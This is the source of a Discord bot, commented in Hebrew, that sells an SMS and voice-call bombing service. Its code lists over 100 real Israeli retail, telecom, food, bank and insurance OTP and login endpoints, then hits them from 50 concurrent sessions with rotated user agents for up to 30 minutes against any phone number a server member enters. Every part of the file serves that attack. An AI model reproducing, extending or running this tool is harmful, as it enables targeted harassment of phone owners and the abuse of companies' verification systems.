import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import secrets
import time
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=50)  # לתוספת מהירות
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== בדיקת מנהל לפקודות ==========
def is_admin():
    async def predicate(interaction: discord.Interaction):
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("❌ רק למנהלים מותר להשתמש בפקודה זו!", ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/146.0.0.0 Mobile Safari/537.36",
]

# ========== APIS - 120+ APIs ==========
APIS = [
    # ===== מג'נטו (40) =====
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "Adika", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "KiwiKids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "LeeCooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "GolfKids", "url": "https://www.golfkids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Steimatzky", "url": "https://www.steimatzky.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "StepIn", "url": "https://www.stepin.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "FoxHome", "url": "https://www.foxhome.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "TerminalX", "url": "https://www.terminalx.com/customer/ajax/post/", "type": "magento"},
    {"name": "AmericanVintage", "url": "https://www.american-vintage.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lacoste", "url": "https://www.lacoste.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tommy", "url": "https://www.tommyhilfiger.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CalvinKlein", "url": "https://www.calvinklein.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UnderArmour", "url": "https://www.underarmour.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Skechers", "url": "https://www.skechers.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Columbia", "url": "https://www.columbia.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Merrell", "url": "https://www.merrell.co.il/customer/ajax/post/", "type": "magento"},
    
    # ===== SMS APIs (40) =====
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "CellcomOTP", "url": "https://digital-api.cellcom.co.il/api/otp/ResendLoginStep1", "method": "PUT", "headers": {"clientid": "CellcomWebApp"}, "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "012", "url": "https://www.012.net.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Golan", "url": "https://www.golantelecom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "019mobile", "url": "https://019mobile.co.il/userarea/ajax/api/", "type": "form", "data": "request=login&action=firstLogin&data_arr%5Baction%5D=2&data_arr%5Bcontact%5D=PHONE"},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "GoodPharm", "url": "https://www.goodpharm.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Be", "url": "https://www.be.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "PizzaHut", "url": "https://www.pizza-hut.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "BurgerAnch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "data": {"phoneNumber": "PHONE"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Moovit", "url": "https://moovit.com/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Isracart", "url": "https://www.isracart.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Bit", "url": "https://www.bit.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "TenBis", "url": "https://tenbis.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Ikea", "url": "https://www.ikea.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "HomeCenter", "url": "https://www.home-center.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Ace", "url": "https://www.ace.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "OfficeDepot", "url": "https://www.office-depot.co.il/api/sms", "data": {"phone": "PHONE"}},
    
    # ===== Voice APIs (20) =====
    {"name": "Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi", "url": "https://api.leumi.co.il/api/otp/send", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Mizrahi", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "data": {"phone": "PHONE", "type": "voice"}},
    {"name": "Beinleumi", "url": "https://api.beinleumi.co.il/auth/send-otp", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Union", "url": "https://api.unionbank.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Jerusalem", "url": "https://api.bank-jerusalem.co.il/auth/otp", "data": {"phone": "PHONE", "voice": True}},
    {"name": "CellcomVoice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "data": {"phone": "PHONE"}},
    {"name": "PartnerVoice", "url": "https://www.partner.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "PelephoneVoice", "url": "https://www.pelephone.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "HotVoice", "url": "https://www.hotmobile.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "BezeqVoice", "url": "https://www.bezeq.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "ShufersalVoice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLeviVoice", "url": "https://www.rami-levy.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "PangoVoice", "url": "https://api.pango.co.il/auth/voice", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "GettVoice", "url": "https://www.gett.com/il/api/voice", "data": {"phone": "PHONE"}},
    {"name": "Clal", "url": "https://api.clalbit.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Harel", "url": "https://api.harel-group.co.il/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "Menora", "url": "https://api.menora.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Phoenix", "url": "https://api.phoenix.co.il/auth/voice", "data": {"phone": "PHONE"}},
    
    # ===== Quick Login (10) =====
    {"name": "Quick247", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickRenuar", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-renuar-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickAldo", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-aldoshoes-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickBillabong", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-billabong-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSacks", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-sacks-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSteve", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-stevemadden-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickFox", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-fox-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickLogin", "url": "https://quick-login.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "QuickAuth", "url": "https://login.quick-login.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "QuickMagento", "url": "https://magento.quick-login.co.il/rest/V1/guest-carts", "data": {"phone": "PHONE"}},
]

print(f"📊 טענתי {len(APIS)} APIs")

# ========== פונקציות שליחה מהירות במיוחד ==========
async def send_magento_fast(session, url, phone_raw):
    """שליחת מג'נטו מהירה"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1,
        "code": "",
        "compare_email": "",
        "compare_identity": ""
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=1.5) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api_fast(session, api, phone, phone_raw, phone_intl):
    """שליחת API מהירה"""
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive"
        }
        
        if api.get("type") == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
            data = api["data"].replace("PHONE", phone)
            async with session.post(api["url"], data=data, headers=headers, timeout=1.5) as resp:
                return resp.status in [200, 201, 202, 204]
        
        else:
            headers["Content-Type"] = "application/json"
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data_str = data_str.replace("PHONE_INTL", phone_intl)
            data = json.loads(data_str)
            
            method = api.get("method", "POST")
            async with session.request(method, api["url"], json=data, headers=headers, timeout=1.5) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפת מהירות על ==========
async def hyper_attack(phone, duration_mins, user_id, interaction, attack_id):
    """מתקפה במהירות מקסימלית - 500+ לשנייה"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    phone_intl = f"+972{phone_raw}"
    
    await interaction.followup.send(
        f"⚡ **HYPER SPEED ATTACK**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(APIS)} APIs\n🚀 מהירות: 500+ לשנייה",
        ephemeral=True
    )
    
    # 50 סשנים במקביל - מהירות מקסימלית!
    sessions = [aiohttp.ClientSession() for _ in range(50)]
    total_sent = 0
    rounds = 0
    last_update = 0
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            rounds += 1
            tasks = []
            
            # שליחה לכל הסשנים
            for session in sessions:
                for api in APIS:
                    if api.get("type") == "magento":
                        tasks.append(send_magento_fast(session, api["url"], phone_raw))
                    else:
                        tasks.append(send_api_fast(session, api, phone, phone_raw, phone_intl))
            
            # הרצת כל המשימות
            results = await asyncio.gather(*tasks, return_exceptions=True)
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            # עדכון כל 5 שניות
            seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
            if seconds > last_update and seconds % 5 == 0:
                last_update = seconds
                rate = total_sent // seconds if seconds > 0 else 0
                await interaction.followup.send(f"⚡ {seconds}s: {total_sent} | {rate}/s", ephemeral=True)
            
            # המתנה מינימלית - 10ms בלבד!
            await asyncio.sleep(0.01)
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    seconds = int((end_time - (end_time - timedelta(minutes=duration_mins))).total_seconds())
    avg_rate = total_sent // seconds if seconds > 0 else 0
    
    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}\n⚡ ממוצע: {avg_rate}/s", ephemeral=True)

# ========== פקודות צוות (למנהלים בלבד) ==========
@bot.tree.command(name="check", description="בדוק APIs (צוות)")
@app_commands.check(is_admin())
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 בודק 20 APIs...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    test_intl = "+972501234567"
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for api in APIS[:20]:
            if api.get("type") == "magento":
                success = await send_magento_fast(session, api["url"], test_raw)
            else:
                success = await send_api_fast(session, api, test_phone, test_raw, test_intl)
            
            if success:
                working.append(api["name"])
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים", ephemeral=True)

@bot.tree.command(name="tokens", description="הוסף טוקנים (צוות)")
@app_commands.check(is_admin())
async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
    user_id = str(member.id)
    await users_col.update_one(
        {"user_id": user_id},
        {"$inc": {"tokens": amount}},
        upsert=True
    )
    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)

# ========== VIEW - לכולם מותר ==========
class AttackModal(ui.Modal, title="⚡ HYPER SPEED"):
    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="3")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 1000})
            user_doc = {"tokens": 1000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים! פנה לצוות", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"⚡ **ACTIVATED**\n📱 {phone}\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(hyper_attack(phone, duration, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="⚡ HYPER SPEED", style=discord.ButtonStyle.danger, emoji="🚀")
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # לכולם מותר
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary, emoji="🔍")
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # רק לצוות
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("❌ רק לצוות!", ephemeral=True)
            return
        await check_command(interaction)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 100})
        tokens = 100
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="⚡ HYPER SPEED BOT",
        description=f"**{len(APIS)}** APIs | 50 סשנים | 10ms בין גלים",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים שלך", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 מתקפות פעילות", value=active, inline=True)
    embed.add_field(name="🚀 מהירות", value="500+/שנייה", inline=True)
    embed.set_footer(text="⚡ לכולם מותר להשתמש בכפתור ATTACK")
    
    await interaction.response.send_message(embed=embed, view=MainView())

if __name__ == "__main__":
    print(f"⚡ טוען {len(APIS)} APIs... (50 סשנים, 10ms מהירות)")
    bot.run(TOKEN)
